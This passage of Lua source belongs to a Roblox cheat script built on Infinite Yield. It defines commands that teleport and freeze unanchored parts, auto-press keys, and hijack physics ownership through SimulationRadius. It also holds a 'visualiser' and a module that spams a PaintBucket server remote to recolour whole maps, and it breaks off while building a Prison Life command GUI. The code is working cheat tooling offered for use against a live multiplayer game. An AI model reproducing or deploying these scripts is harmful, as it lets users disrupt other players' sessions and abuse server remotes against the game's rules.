		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing getnilinstances)')
		end
	end)

	addcmd('destroyheight',{'dh'},function(args, speaker)
		local dh = args[1] or -500
		if isNumber(dh) then
			workspace.FallenPartsDestroyHeight = dh
		end
	end)

	addcmd('trip',{},function(args, speaker)
		if speaker and speaker.Character and speaker.Character:FindFirstChildOfClass("Humanoid") and getRoot(speaker.Character) then
			local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
			local root = getRoot(speaker.Character)
			hum:ChangeState(0)
			root.Velocity = root.CFrame.LookVector * 30
		end
	end)

	local freezingua = nil
	frozenParts = {}
	addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
		if sethidden then
			local badnames = {
				"Head",
				"UpperTorso",
				"LowerTorso",
				"RightUpperArm",
				"LeftUpperArm",
				"RightLowerArm",
				"LeftLowerArm",
				"RightHand",
				"LeftHand",
				"RightUpperLeg",
				"LeftUpperLeg",
				"RightLowerLeg",
				"LeftLowerLeg",
				"RightFoot",
				"LeftFoot",
				"Torso",
				"Right Arm",
				"Left Arm",
				"Right Leg",
				"Left Leg",
				"HumanoidRootPart"
			}
			local function FREEZENOOB(v)
				if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
					local BADD = false
					for i = 1,#badnames do
						if v.Name == badnames[i] then
							BADD = true
						end
					end
					if speaker.Character and v:IsDescendantOf(speaker.Character) then
						BADD = true
					end
					if BADD == false then
						for i,c in pairs(v:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						local bodypos = Instance.new("BodyPosition")
						bodypos.Parent = v
						bodypos.Position = v.Position
						bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
						local bodygyro = Instance.new("BodyGyro")
						bodygyro.Parent = v
						bodygyro.CFrame = v.CFrame
						bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
						if not table.find(frozenParts,v) then
							table.insert(frozenParts,v)
						end
					end
				end
			end
			for i,v in pairs(workspace:GetDescendants()) do
				FREEZENOOB(v)
			end
			freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('thawunanchored',{'thawua','unfreezeunanchored','unfreezeua'},function(args, speaker)
		if sethidden then
			if freezingua then
				freezingua:Disconnect()
			end
			for i,v in pairs(frozenParts) do
				for i,c in pairs(v:GetChildren()) do
					if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
						c:Destroy()
					end
				end
			end
			frozenParts = {}
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('tpunanchored',{'tpua'},function(args, speaker)
		if sethidden then
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local Forces = {}
				for _,part in pairs(workspace:GetDescendants()) do
					if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
						for i,c in pairs(part:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						local ForceInstance = Instance.new("BodyPosition")
						ForceInstance.Parent = part
						ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						table.insert(Forces, ForceInstance)
						if not table.find(frozenParts,part) then
							table.insert(frozenParts,part)
						end
					end
				end
				for i,c in pairs(Forces) do
					c.Position = Players[v].Character.Head.Position
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	keycodeMap = {
		["0"] = 0x30,
		["1"] = 0x31,
		["2"] = 0x32,
		["3"] = 0x33,
		["4"] = 0x34,
		["5"] = 0x35,
		["6"] = 0x36,
		["7"] = 0x37,
		["8"] = 0x38,
		["9"] = 0x39,
		["a"] = 0x41,
		["b"] = 0x42,
		["c"] = 0x43,
		["d"] = 0x44,
		["e"] = 0x45,
		["f"] = 0x46,
		["g"] = 0x47,
		["h"] = 0x48,
		["i"] = 0x49,
		["j"] = 0x4A,
		["k"] = 0x4B,
		["l"] = 0x4C,
		["m"] = 0x4D,
		["n"] = 0x4E,
		["o"] = 0x4F,
		["p"] = 0x50,
		["q"] = 0x51,
		["r"] = 0x52,
		["s"] = 0x53,
		["t"] = 0x54,
		["u"] = 0x55,
		["v"] = 0x56,
		["w"] = 0x57,
		["x"] = 0x58,
		["y"] = 0x59,
		["z"] = 0x5A,
		["enter"] = 0x0D,
		["shift"] = 0x10,
		["ctrl"] = 0x11,
		["alt"] = 0x12,
		["pause"] = 0x13,
		["capslock"] = 0x14,
		["spacebar"] = 0x20,
		["space"] = 0x20,
		["pageup"] = 0x21,
		["pagedown"] = 0x22,
		["end"] = 0x23,
		["home"] = 0x24,
		["left"] = 0x25,
		["up"] = 0x26,
		["right"] = 0x27,
		["down"] = 0x28,
		["insert"] = 0x2D,
		["delete"] = 0x2E,
		["f1"] = 0x70,
		["f2"] = 0x71,
		["f3"] = 0x72,
		["f4"] = 0x73,
		["f5"] = 0x74,
		["f6"] = 0x75,
		["f7"] = 0x76,
		["f8"] = 0x77,
		["f9"] = 0x78,
		["f10"] = 0x79,
		["f11"] = 0x7A,
		["f12"] = 0x7B,
	}
	autoKeyPressing = false
	cancelAutoKeyPress = nil

	addcmd('autokeypress',{'keypress'},function(args, speaker)
		if keypress and keyrelease and args[1] then
			local code = keycodeMap[args[1]:lower()]
			if not code then notify('Auto Key Press',"Invalid key") return end
			execCmd('unautokeypress')
			wait()
			local clickDelay = 0.1
			local releaseDelay = 0.1
			if args[2] and isNumber(args[2]) then clickDelay = args[2] end
			if args[3] and isNumber(args[3]) then releaseDelay = args[3] end
			autoKeyPressing = true
			cancelAutoKeyPress = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
						autoKeyPressing = false
						cancelAutoKeyPress:Disconnect()
					end
				end
			end)
			notify('Auto Key Press',"Press [backspace] and [=] at the same time to stop")
			repeat wait(clickDelay)
				keypress(code)
				wait(releaseDelay)
				keyrelease(code)
			until autoKeyPressing == false
			if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() keyrelease(code) end
		else
			notify('Auto Key Press',"Your exploit doesn't have the ability to use auto key press")
		end
	end)

	addcmd('unautokeypress',{'noautokeypress','unkeypress','nokeypress'},function(args, speaker)
		autoKeyPressing = false
		if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() end
	end)

	addcmd('addplugin',{'plugin'},function(args, speaker)
		addPlugin(getstring(1))
	end)

	addcmd('removeplugin',{'deleteplugin'},function(args, speaker)
		deletePlugin(getstring(1))
	end)

	addcmd('reloadplugin',{},function(args, speaker)
		local pluginName = getstring(1)
		deletePlugin(pluginName)
		wait(1)
		addPlugin(pluginName)
	end)

	addcmd('removecmd',{'deletecmd'},function(args, speaker)
		removecmd(args[1])
	end)

	if IsOnMobile then
		local QuickCapture = Instance.new("TextButton")
		local UICorner = Instance.new("UICorner")
		QuickCapture.Name = randomString()
		QuickCapture.Parent = PARENT
		QuickCapture.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		QuickCapture.BackgroundTransparency = 0.14
		QuickCapture.Position = UDim2.new(0.489, 0, 0, 0)
		QuickCapture.Size = UDim2.new(0, 32, 0, 33)
		QuickCapture.Font = Enum.Font.SourceSansBold
		QuickCapture.Text = "IY"
		QuickCapture.TextColor3 = Color3.fromRGB(255, 255, 255)
		QuickCapture.TextSize = 20.000
		QuickCapture.TextWrapped = true
		QuickCapture.Draggable = true
		UICorner.Name = randomString()
		UICorner.CornerRadius = UDim.new(0.5, 0)
		UICorner.Parent = QuickCapture
		QuickCapture.MouseButton1Click:Connect(function()
			Cmdbar:CaptureFocus()
			maximizeHolder()
		end)
		table.insert(shade1, QuickCapture)
		table.insert(text1, QuickCapture)
	end

	updateColors(currentShade1,shade1)
	updateColors(currentShade2,shade2)
	updateColors(currentShade3,shade3)
	updateColors(currentText1,text1)
	updateColors(currentText2,text2)
	updateColors(currentScroll,scroll)

	if PluginsTable ~= nil or PluginsTable ~= {} then
		FindPlugins(PluginsTable)
	end

	-- Events
	eventEditor.RegisterEvent("OnExecute")
	eventEditor.RegisterEvent("OnSpawn",{
		{Type="Player",Name="Player Filter ($1)"}
	})
	eventEditor.RegisterEvent("OnDied",{
		{Type="Player",Name="Player Filter ($1)"}
	})
	eventEditor.RegisterEvent("OnDamage",{
		{Type="Player",Name="Player Filter ($1)"},
		{Type="Number",Name="Below Health ($2)"}
	})
	eventEditor.RegisterEvent("OnKilled",{
		{Type="Player",Name="Victim Player ($1)"},
		{Type="Player",Name="Killer Player ($2)",Default = 1}
	})
	eventEditor.RegisterEvent("OnJoin",{
		{Type="Player",Name="Player Filter ($1)",Default = 1}
	})
	eventEditor.RegisterEvent("OnChatted",{
		{Type="Player",Name="Player Filter ($1)",Default = 1},
		{Type="String",Name="Message Filter ($2)"}
	})

	function hookCharEvents(plr,instant)
		task.spawn(function()
			local char = plr.Character
			if not char then return end

			local humanoid = char:WaitForChild("Humanoid",10)
			if not humanoid then return end

			local oldHealth = humanoid.Health
			humanoid.HealthChanged:Connect(function(health)
				local change = math.abs(oldHealth - health)
				if oldHealth > health then
					eventEditor.FireEvent("OnDamage",plr.Name,tonumber(health))
				end
				oldHealth = health
			end)

			humanoid.Died:Connect(function()
				eventEditor.FireEvent("OnDied",plr.Name)

				local killedBy = humanoid:FindFirstChild("creator")
				if killedBy and killedBy.Value and killedBy.Value.Parent then
					eventEditor.FireEvent("OnKilled",plr.Name,killedBy.Name)
				end
			end)
		end)
	end

	Players.PlayerAdded:Connect(function(plr)
		eventEditor.FireEvent("OnJoin",plr.Name)
		plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
		plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
		JoinLog(plr)
		ChatLog(plr)
		if ESPenabled then
			repeat wait(1) until plr.Character and getRoot(plr.Character)
			ESP(plr)
		end
		if CHMSenabled then
			repeat wait(1) until plr.Character and getRoot(plr.Character)
			CHMS(plr)
		end
	end)

	for _,plr in pairs(Players:GetPlayers()) do
		pcall(function()
			plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
			hookCharEvents(plr)
		end)
	end

	if spawnCmds and #spawnCmds > 0 then
		for i,v in pairs(spawnCmds) do
			eventEditor.AddCmd("OnSpawn",{v.COMMAND or "",{0},v.DELAY or 0})
		end
		updatesaves()
	end

	if loadedEventData then eventEditor.LoadData(loadedEventData) end
	eventEditor.Refresh()

	eventEditor.FireEvent("OnExecute")

	if aliases and #aliases > 0 then
		local cmdMap = {}
		for i,v in pairs(cmds) do
			cmdMap[v.NAME:lower()] = v
			for _,alias in pairs(v.ALIAS) do
				cmdMap[alias:lower()] = v
			end
		end
		for i = 1, #aliases do
			local cmd = string.lower(aliases[i].CMD)
			local alias = string.lower(aliases[i].ALIAS)
			if cmdMap[cmd] then
				customAlias[alias] = cmdMap[cmd]
			end
		end
		refreshaliases()
	end

	IYMouse.Move:Connect(checkTT)

	task.spawn(function()
		local success, latestVersionInfo = pcall(function() 
			local versionJson = game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/version')
			return HttpService:JSONDecode(versionJson)
		end)

		if success then
			if currentVersion ~= latestVersionInfo.Version then
				notify('Outdated','Get the new version at infyiff.github.io')
			end

			if latestVersionInfo.Announcement and latestVersionInfo.Announcement ~= '' then
				local AnnGUI = Instance.new("Frame")
				local background = Instance.new("Frame")
				local TextBox = Instance.new("TextLabel")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("TextButton")
				local ExitImage = Instance.new("ImageLabel")

				AnnGUI.Name = randomString()
				AnnGUI.Parent = PARENT
				AnnGUI.Active = true
				AnnGUI.BackgroundTransparency = 1
				AnnGUI.Position = UDim2.new(0.5, -180, 0, -500)
				AnnGUI.Size = UDim2.new(0, 360, 0, 20)
				AnnGUI.ZIndex = 10

				background.Name = "background"
				background.Parent = AnnGUI
				background.Active = true
				background.BackgroundColor3 = currentShade1
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 0, 20)
				background.Size = UDim2.new(0, 360, 0, 150)
				background.ZIndex = 10

				TextBox.Parent = background
				TextBox.BackgroundTransparency = 1
				TextBox.Position = UDim2.new(0, 5, 0, 5)
				TextBox.Size = UDim2.new(0, 350, 0, 140)
				TextBox.Font = Enum.Font.SourceSans
				TextBox.TextSize = 18
				TextBox.TextWrapped = true
				TextBox.Text = Announcement
				TextBox.TextColor3 = currentText1
				TextBox.TextXAlignment = Enum.TextXAlignment.Left
				TextBox.TextYAlignment = Enum.TextYAlignment.Top
				TextBox.ZIndex = 10

				shadow.Name = "shadow"
				shadow.Parent = AnnGUI
				shadow.BackgroundColor3 = currentShade2
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 360, 0, 20)
				shadow.ZIndex = 10

				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Size = UDim2.new(1, 0, 0.95, 0)
				PopupText.ZIndex = 10
				PopupText.Font = Enum.Font.SourceSans
				PopupText.TextSize = 14
				PopupText.Text = "Server Announcement"
				PopupText.TextColor3 = currentText1
				PopupText.TextWrapped = true

				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundTransparency = 1
				Exit.Position = UDim2.new(1, -20, 0, 0)
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.Text = ""
				Exit.ZIndex = 10

				ExitImage.Parent = Exit
				ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
				ExitImage.BackgroundTransparency = 1
				ExitImage.Position = UDim2.new(0, 5, 0, 5)
				ExitImage.Size = UDim2.new(0, 10, 0, 10)
				ExitImage.Image = "rbxassetid://5054663650"
				ExitImage.ZIndex = 10

				wait(1)
				AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)

				Exit.MouseButton1Click:Connect(function()
					AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
					wait(0.6)
					AnnGUI:Destroy()
				end)
			end
		end
	end)

	task.spawn(function()
		wait()
		Credits:TweenPosition(UDim2.new(0, 0, 0.9, 0), "Out", "Quart", 0.2)
		Logo:TweenSizeAndPosition(UDim2.new(0, 175, 0, 175), UDim2.new(0, 37, 0, 45), "Out", "Quart", 0.3)
		wait(1)
		local OutInfo = TweenInfo.new(1.6809, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
		TweenService:Create(Logo, OutInfo, {ImageTransparency = 1}):Play()
		TweenService:Create(IntroBackground, OutInfo, {BackgroundTransparency = 1}):Play()
		Credits:TweenPosition(UDim2.new(0, 0, 0.9, 30), "Out", "Quart", 0.2)
		wait(0.2)
		Logo:Destroy()
		Credits:Destroy()
		IntroBackground:Destroy()
		minimizeHolder()
		if IsOnMobile then notify("Unstable Device", "On mobile, Infinite Yield may have issues or features that are not functioning correctly.") end
	end)

end

function mod:LoadVis()
	_G.prefix = ""
	_G.sens = 50
	_G.angle = 3
	_G.offset = 90
	_G.vis = false
	_G.rots = 50
	local sens = _G.sens  
	local angle = _G.angle
	local offset = _G.offset
	local rots = _G.rots
	local vis = _G.vis
	_G.initialRotationOffset = math.rad(360)
	_G.flipHorizontally = true
	_G.flipVertically = true
	_G.distance = 5

	_G.maxDistance = 500
	local maxDistance = _G.maxDistance
	_G.amount = 40
	local amount = _G.amount
	_G.x = 5
	local x = _G.x
	_G.y = 2.00000000012341234123462
	_G.z = 2
	_G.partvis = true
	_G.rx = 20
	_G.ry = 0
	_G.rz = 0
	local y = _G.y
	local z = _G.z
	local rx = _G.rx
	local ry = _G.ry
	local rz = _G.rz
	_G.centrepos = game.Players.LocalPlayer.Character.HumanoidRootPart
	local Folder243 = workspace.Terrain._Game.Folder
	print("loaded visualiser")
	local function tchat(ch)
		workspace.ChatWindow_MessagePosted:fire(ch)
	end




	local plr = game.Players.LocalPlayer
	_G.partvis = true
	pcall(
		function()
			if not plr.Character:FindFirstChild("PaintBucket") then
				tchat("gear me 000000000000000000000000000000000000000000000000000018474459")
				local paint = plr.Backpack:WaitForChild("PaintBucket")
				paint.Parent = plr.Character
				wait(.1)
				if not plr.Character:FindFirstChild(paint) then
					error("Paint Bucket was removed from player?")
				end
			end
		end
	)
	print("yes")
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local unanchoredparts = {}
	local movers = {}
	local Players = game:GetService("Players")
	for i = 1, _G.amount do
		tchat("part/"..x.."/"..y.."/"..z)
		task.wait()
	end
	print("yes1")
	task.wait(.2)
	local ignore = {}
	for index, part in pairs(workspace.Terrain._Game.Folder:GetDescendants()) do
		if part:IsA("Part") and part.Anchored == false and part:IsDescendantOf(LocalPlayer.Character) == false and part:IsDescendantOf(game.Players) == false then
			if part.Size == Vector3.new(x, y, z) then
				table.insert(unanchoredparts, part)
				part.Massless = true
				part.CanCollide = false
				part.Velocity = Vector3.new(34, 54, 0)
				part.Anchored = false
				part.Name = "part1"
				if part:FindFirstChildOfClass("BodyPosition") ~= nil then
					part:FindFirstChildOfClass("BodyPosition"):Destroy()
				end
			end
		end
	end
	print("yes2")
	local center = Instance.new("Part")
	center.Size = Vector3.new(1, 1, 1)
	center.Anchored = true
	center.Transparency = 1
	center.CanCollide = false
	center.Parent = workspace
	_G.vis = true
	for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
		if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
			l=game:GetService("RunService").Heartbeat:connect(function()
				if vis == false then l:disconnect() end
				v.Velocity = Vector3.new(34, 54, 0)
			end)
		end
	end
	print("yes3")
	coroutine.wrap(function()
		while vis == true do
			local speed = 32
			for i = 0,1,0.0003*speed do task.wait()
				local clr = Color3.fromHSV(i,1,1)
				--local padss = ws.Terrain["_Game"]:GetDescendants()
				for i, v in pairs(Folder243:GetChildren()) do
					coroutine.wrap(function()
						if v.Name == "part1" then
							local v1 =
								{
									["Part"] = v,
									["Color"] = clr
								}
							game:GetService("Players").LocalPlayer.Character.PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", v1)
						end
					end)()
				end
				task.wait(1 / 12)
			end
		end
	end)()
	print("yes4")
	coroutine.wrap(function()
		while vis == true do
			task.wait()
			_G.partscleared = true
			for i,v in pairs(workspace.Terrain._Game.Folder:GetDescendants()) do
				if v.Name == "Part" and v.Size == Vector3.new(x, y, z) then
					partscleared = false
					break
				end
			end    
			if partscleared then

			end
		end
	end)()
	print("yes5")
	local upX = 1
	local upY = 6

	a=game:GetService("RunService").Heartbeat:connect(function()
		for i,v in next, game.Players.LocalPlayer.Character:GetDescendants() do

			if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
				v.Velocity = Vector3.new(-30,0,0)
			end
		end
		LocalPlayer.SimulationRadius = 999.9
		LocalPlayer.MaximumSimulationRadius = math.huge
		-- Configure network services
		settings().Physics.AllowSleep = false -- Keep the current physics system from sleeping. (Non-moving parts lose ownership.)
		settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled -- Keep the physics from throttling.

		if vis == false then
			for _, mover in pairs(movers) do 
				unanchoredparts = {}
				a:disconnect()
			end
		end
		if vis == true then
			for i, part in ipairs(unanchoredparts) do
				part.Velocity = Vector3.new(34, 54, 0)
				local Folder243 = workspace.Terrain._Game.Folder
				for i, v in pairs(Folder243:GetDescendants()) do 
					if v:IsA("Sound") and v.PlaybackLoudness then
						distance = 8 + v.PlaybackLoudness / _G.sens
					end
				end
				distance = math.min(distance, maxDistance)
				local character = game.Players.LocalPlayer.Character
				local rootPart = _G.centrepos

				local angle = math.rad((i - 1) * 38)
				local rotationAngle = math.rad(rots * os.clock())
				local offsetX = distance * math.cos(angle + rotationAngle + initialRotationOffset)
				local offsetY = _G.angle * math.sin(_G.offset * angle + rotationAngle)
				local offsetZ = distance * math.sin(angle + rotationAngle + initialRotationOffset)
				local rotatedPosition = rootPart.Position + Vector3.new(0, 14, 0) + Vector3.new(offsetX, offsetY, offsetZ)
				local lookVector = (rootPart.Position - rotatedPosition).Unit
				local upVector = Vector3.new(4, 5, 5)
				local rotation = CFrame.lookAt(Vector3.new(), lookVector, upVector)
				part.CFrame = CFrame.new(rotatedPosition) * rotation
				part.Rotation = part.Rotation + Vector3.new(rx, ry, rz)
			end	
		end	
	end)





	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		if cmd == _G.prefix.."novis" then
			_G.partvis = false
			tchat("clr")
			_G.vis = true
		end
	end)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		local a = msgsplit[2]
		local b = msgsplit[3]
		local c = msgsplit[4]
		if cmd == _G.prefix.."vsize" then
			_G.c = 1
			_G.b = 2 + 0.00000000012341234123462
			_G.a = 5
		end
	end)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		local wtv = msgsplit[2]
		if cmd == "sens" then
			_G.sens = tonumber(wtv)
		end
	end)

	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		local speed = msgsplit[2]
		if cmd == "givevis" then
			for _,v in pairs(game.Players:GetPlayers()) do 
				if string.match(v.Name:sub(1,2):lower(), speed:sub(1,2):lower()) or string.match(v.Name:sub(1,3):lower(), speed:sub(1,3):lower()) then 
					_G.centrepos = v.Character.HumanoidRootPart 
				end 
			end
		end
	end)


	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		local speed = msgsplit[2]
		if cmd == _G.prefix.."vspeed" then
			_G.rots = tonumber(speed)
		end
	end)


	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		local part = msgsplit[2]
		if cmd == "mode" then
			_G.angle = tonumber(part)
		end
		if cmd == "var" then
			_G.offset = tonumber(part)
		end
	end)


	game.Players.LocalPlayer.Chatted:Connect(function(msg)
		local msgsplit = msg:split(" ")
		local cmd = msgsplit[1]
		local part = msgsplit[2]
		if cmd == _G.prefix.."vparts" then
			game.Players:Chat("clr")
			_G.amount = part
		end
	end)





end

function mod:Fencing()


	function _G.rainbow()
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name == "PaintBucket" then
				v.GripPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(0, 5, 0)
			end
		end
		_G.crail = true
		wait(.6)
		local speed = 32

		for i = 0,1,0.0002*speed do task.wait()
			local clr = Color3.fromHSV(i,1,1)
			--local padss = ws.Terrain["_Game"]:GetDescendants()
			for i, v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					coroutine.wrap(function()
						local v1 =
							{
								["Part"] = v,
								["Color"] = clr
							}
						game:GetService("Players").LocalPlayer.Character.PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", v1)
					end)()
				end
			end
			wait(1 / 12) -- recolor the map x times a second lol.
		end
		task.wait(1)

	end



	function _G.colour(part, c1, c2, c3)

		local args = {
			[1] = "PaintPart",
			[2] = {
				["Part"] = part,
				["Color"] = Color3.new(c1, c2, c3)
			}
		}
		spawn(
			function()
				game.Players.LocalPlayer.Character:WaitForChild("PaintBucket"):WaitForChild("Remotes").ServerControls:InvokeServer(
					unpack(args)
				)
			end
		)
	end



	function _G.black()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.0666667, 0.0666667, 0.0666667)
			end
		end
	end

	function _G.white()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.972549, 0.972549, 0.972549)
			end
		end
	end

	function _G.red()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 1, 0, 0)
			end
		end
	end

	function _G.blue()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.0352941, 0.537255, 0.811765)
			end
		end
	end

	function _G.green()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.121569, 0.501961, 0.113725)
			end
		end
	end

	function _G.orange()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.666667, 0.333333, 0)
			end
		end
	end

	function _G.yellow()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 1, 1, 0)
			end
		end
	end

	function _G.brown()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.486275, 0.360784, 0.27451)
			end
		end
	end


	function _G.purple()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 0.482353, 0, 0.482353)
			end
		end
	end

	function _G.pink()
		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, 1, 0.4, 0.8)
			end
		end
	end



	function _G.random()

		for i, v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("Part") then
				_G.colour(v, math.random(), math.random(), math.random())
			end
		end
	end

	function _G.randomize()
		while game.Players.LocalPlayer.Character:FindFirstChild("PaintBucket") do
			wait()
			for i, v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					_G.colour(v, math.random(), math.random(), math.random())
				end
			end
		end
	end

end



function mod:LoadPrisonLife()
	--(HINT: For big blocks of code like this, in the top right corner of this code box, there is a button that says "Raw". Click that and then it will bring you to a page that has only the code. Then use ctrl + a to copy the whole code. Yw)

	local CmdGui = Instance.new("ScreenGui")
	local Background = Instance.new("Frame")
	local CmdName = Instance.new("TextLabel")
	local FindCmd = Instance.new("TextBox")
	local CmdHandler = Instance.new("ScrollingFrame")
	local CmdText = Instance.new("TextButton")
	local UIListLayout = Instance.new("UIListLayout")
	local Background2 = Instance.new("Frame")
	local Label = Instance.new("TextLabel")
	local Execute = Instance.new("TextBox")
	local Minimum = Instance.new("TextButton")
	local Close = Instance.new("TextButton")
	local Background3 = Instance.new("Frame")
	local Topbar = Instance.new("TextLabel")
	local CmdTitle = Instance.new("TextLabel")
	local Background4 = Instance.new("Frame")
	local Notify6 = Instance.new("TextLabel")
	local Notify5 = Instance.new("TextLabel")
	local Notify4 = Instance.new("TextLabel")
	local Notify3 = Instance.new("TextLabel")
	local Notify2 = Instance.new("TextLabel")
	local Notify1 = Instance.new("TextLabel")
	local CloseBar = Instance.new("TextButton")
	local TransparencyBar = Instance.new("TextButton")
	local Prefix = ";"
	local coregui = game.Players.LocalPlayer.PlayerGui
	CmdGui.Name = "CmdGui"
	CmdGui.Parent = coregui
	CmdGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	Background.Name = "Background"
	Background.Parent = CmdGui
	Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.368556708, 0, 0.11490047, 0)
	Background.Size = UDim2.new(0, 350, 0, 350)
	Background.Active = true
	Background.Draggable = true

	CmdName.Name = "CmdName"
	CmdName.Parent = Background
	CmdName.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CmdName.BorderSizePixel = 0
	CmdName.Size = UDim2.new(0, 350, 0, 25)
	CmdName.Font = Enum.Font.GothamBlack
	CmdName.Text = "Commands"
	CmdName.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdName.TextScaled = true
	CmdName.TextSize = 14.000
	CmdName.TextWrapped = true

	FindCmd.Name = "FindCmd"
	FindCmd.Parent = Background
	FindCmd.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	FindCmd.BorderColor3 = Color3.fromRGB(0, 255, 0)
	FindCmd.BorderSizePixel = 0
	FindCmd.Position = UDim2.new(0.0714285746, 0, 0.0702347234, 0)
	FindCmd.Size = UDim2.new(0, 300, 0, 20)
	FindCmd.Font = Enum.Font.SourceSans
	FindCmd.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	FindCmd.PlaceholderText = "Search For Command"
	FindCmd.Text = ""
	FindCmd.TextColor3 = Color3.fromRGB(255, 255, 255)
	FindCmd.TextSize = 14.000
	FindCmd.TextWrapped = true

	CmdHandler.Name = "CmdHandler"
	CmdHandler.Parent = Background
	CmdHandler.Active = true
	CmdHandler.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdHandler.BackgroundTransparency = 1.000
	CmdHandler.BorderSizePixel = 0
	CmdHandler.AutomaticCanvasSize = "Y"
	CmdHandler.Position = UDim2.new(0.0714285746, 0, 0.142857149, 0)
	CmdHandler.Size = UDim2.new(0, 300, 0, 290)
	CmdHandler.ScrollBarThickness = 2

	CmdText.Name = "CmdText"
	CmdText.Parent = nil
